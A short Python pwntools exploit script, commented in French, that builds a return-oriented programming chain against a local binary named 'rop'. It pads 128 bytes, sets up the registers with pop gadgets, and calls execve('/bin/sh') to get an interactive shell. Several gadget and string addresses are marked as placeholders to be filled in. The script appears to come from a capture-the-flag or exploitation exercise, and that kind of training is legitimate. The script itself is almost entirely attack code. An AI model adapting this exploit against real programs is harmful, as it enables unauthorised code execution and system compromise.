from pwn import *
from struct import pack

# Adresse du gadget pop rdi ; ret
gadget_pop_rdi = 0x0000000000401d10
# Adresse de la chaîne "/bin/sh" (à ajuster ou injecter)
bin_sh = 0x41414141  # Remplacer par la bonne adresse de "/bin/sh"

# Remplir le buffer pour atteindre l'adresse de retour
p = b'A' * 128

# Charger "/bin/sh" dans rdi
p += pack('<Q', gadget_pop_rdi)
p += pack('<Q', bin_sh)

# Charger 0 dans rsi (deuxième argument de execve)
gadget_pop_rsi = 0x0000000000401234  # Trouver un gadget pop rsi ; ret
p += pack('<Q', gadget_pop_rsi)
p += pack('<Q', 0)

# Charger 0 dans rdx (troisième argument de execve)
gadget_pop_rdx = 0x0000000000405678  # Trouver un gadget pop rdx ; ret
p += pack('<Q', gadget_pop_rdx)
p += pack('<Q', 0)

# Appeler execve("/bin/sh", NULL, NULL)
execve_addr = 0x0000000000403030  # Adresse de execve (à déterminer)
p += pack('<Q', execve_addr)

# Exécution de l'exploit
r = process('./rop')
r.sendline(p)
r.interactive()
